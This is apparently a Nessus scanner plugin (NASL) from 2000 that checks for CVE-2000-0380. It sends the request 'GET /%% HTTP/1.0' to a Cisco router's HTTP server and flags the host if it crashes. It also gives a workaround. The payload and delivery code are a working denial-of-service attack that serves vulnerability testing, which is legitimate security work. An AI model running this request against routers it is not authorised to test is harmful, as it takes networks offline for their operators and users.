#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10387);
 script_bugtraq_id(1154);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-2000-0380"); 
 name["english"] = "cisco http DoS";
 name["francais"] = "Déni de service Cisco par http";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to lock
the remote server (probably a Cisco router)
by doing the request :

	GET /%% HTTP/1.0
	

You need to reboot it to make it work
again.
	
An attacker may use this flaw to crash this
host, thus preventing your network from
working properly.
	
Workaround : add the following rule
in your router :

 no ip http server


Solution :  contact CISCO for a fix
Risk factor : High";

 desc["francais"] = "
Il s'est avéré possible de bloquer
le routeur distant en faisant la requete :

	GET /%% HTTP/1.0
	
Vous devez le rebooter pour qu'il soit
de nouveau accessible.

Solution temporaire : rajoutez la regle :
	no ip http server
	
Solution : contactez CISCO pour un patch
Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes a Cisco router";
 summary["francais"] = "Fait planter un routeur Cisco";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nes");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

port = get_http_port(default:80);

if (http_is_dead(port:port)) exit(0);

if(get_port_state(port))
{
  soc = http_open_socket(port);
  if(soc)
  {
  data = http_get(item:"/%%", port:port);
  send(socket:soc, data:data);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(http_is_dead(port: port))security_hole(port);
  }
}
